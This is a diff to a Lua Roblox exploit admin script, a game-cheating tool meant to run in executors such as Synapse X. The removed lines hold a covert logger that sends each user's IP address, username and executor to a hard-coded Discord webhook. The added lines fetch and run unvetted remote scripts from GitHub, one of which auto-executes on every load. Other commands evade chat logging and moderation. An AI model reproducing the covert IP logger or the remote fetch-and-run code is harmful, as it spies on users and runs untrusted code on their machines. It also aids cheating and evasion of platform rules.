@@ -6214,7 +6214,7 @@ game:GetService("NetworkClient").ConnectionAccepted:connect(function(peer)
              CEnv[1] = true
          end
      end
-     return "antiafk " .. (IsEnabled and " disabled" or "enabled");
+     return "antiafk " .. (IsEnabled and " disabled" or "enabled")
  end)
  
  AddCommand("clicktp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
@@ -6613,8 +6613,24 @@ end)
      return "script must be in autoexecute for info to be retrieved"
  end)
  
- AddCommand("dex", {"darkdex"}, "A quick way to execute dark dex from the synapse script hub.", {}, loadstring(game:HttpGet("https://cdn.synapse.to/synapsedistro/hub/DarkDex.lua")));
- 
+ AddCommand("antichatlog", {"+antichatlog", "antichatlogger", "anticl", "acl"}, "dont let roblox log your meassages. in a result prevents u from getting banned for chats", {{"on", "off"}}, function(Caller, Args)
+
+    local FilePath = "dark's-admin/Data/ACL.txt"
+    local OnOffStatus = Args[1]
+    local AclValue = readfile(FilePath)
+-- value shit
+
+    if OnOffStatus == "off" then
+        writefile(FilePath, "False")
+    elseif OnOffStatus == "on" then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KGFKILLERPRO/anti-chat-logger/main/anti%20chat%20logger"))()
+
+writefile(FilePath, "True")
+Utils.Notify(LocalPlayer, "autoexec", "this function will now auto execute everytime script gets executed. do off to turn autoexec off")
+    end
+ end)
+  
  AddCommand("chatbypass", {"+chatbypass", "ChatBypass", "chatbypasser", "cb"}, "chat bypasser ofc", {}, function(Caller, Args)
     if syn then
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/scripts/main/vadriftsbyp'),true))()
@@ -6624,6 +6640,7 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/scripts/main
 
     end
 end)
+
 AddCommand("dex", {"+darkdex", "darkdex"}, "executes dark dex.. DUH", {}, function(Caller, Args)
     if syn then
         loadstring(game:HttpGet("https://cdn.synapse.to/synapsedistro/hub/DarkDex.lua"))
@@ -10237,7 +10254,12 @@ end)
              SetConfig({KillCam=Callback});
              _L.KillCam = Callback
          end)
- 
+
+         Misc.Toggle("Anti Afk", AntiAfk, function(Callback)
+            ExecuteCommand("antiafk", {}, LocalPlayer)
+            print("antiafk executed")
+         end)
+
          local OldFireTouchInterest = firetouchinterest
          Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
              firetouchinterest = Callback and function(part1, part2, toggle)
@@ -10697,51 +10719,32 @@ loopboothblacklist = false
 Utils.Notify(LocalPlayer, "LoopBoothBlacklist", "LoopBoothBlacklist deactivated", 10)
 end)
 
+local FolderPath = "dark's-admin/Data"
+local FilePath = "dark's-admin/Data/ACL.txt"
+-- file path and folder path and value
 
- Utils.Notify(LocalPlayer, "compatible game detected", "ayoo rma got some scripts up its sleeves. type * in cmds", 10);
+if not isfolder(FolderPath) then
+    makefolder(FolderPath)
+    wait(4)
+    Utils.Notify(LocalPlayer, "Created", "the Data folder was not found. created it")
+end
+-- checks if folder exists. if not creates it.
+
+if not isfile(FilePath) then
+    writefile(FilePath, "False")
+end
+-- checks if file exists. if not creates it.
+local AclValue = readfile(FilePath)
+
+if AclValue == "True" then
+        
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KGFKILLERPRO/anti-chat-logger/main/anti%20chat%20logger"))()
+-- checks if Value is set to True if yes executes a script
+end
+
+ Utils.Notify(LocalPlayer, "compatible game detected", "ayoo rma got some scripts up its sleeves. type * in cmds", 10)
  end
  
- Utils.Notify(LocalPlayer, "Executed!", format("script loaded in %.3f seconds", (tick()) - _L.start));
- 
- Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, type + in cmds to see added scripts");
+ Utils.Notify(LocalPlayer, "Executed!", format("script loaded in %.3f seconds", (tick()) - _L.start))
 
- local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1073832637669572720/5hVbQcUGT2SfwGKBG8ToPlO0lGwCkYDPnTusVpO1xb04VwNOesDdueAIpzS8NodzVS63"
-local data = {
-   ["content"] = "",
-   ["embeds"] = {
-       {
-           ["title"] = "Someone Executed Your Script!",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with "..webhookcheck..". Their ip is: "..ip,
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
- if (debug.info(2, "f") == nil) then
-     Utils.Notify(LocalPlayer, "Outdated Script", "my guy. use the loadstring. thx", 10);
- end
- _L.LatestCommit = JSONDecode(Services.HttpService, game.HttpGetAsync(game, "https://api.github.com/repos/KGFKILLERPRO/dark-admin/commits?per_page=1&path=Fates%20admin%20modded"))[1]
- wait(1);
- Utils.Notify(LocalPlayer, "Newest Update", format("%s - %s", _L.LatestCommit.commit.message, _L.LatestCommit.commit.author.name))
+ Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, type + in cmds to see added scripts")
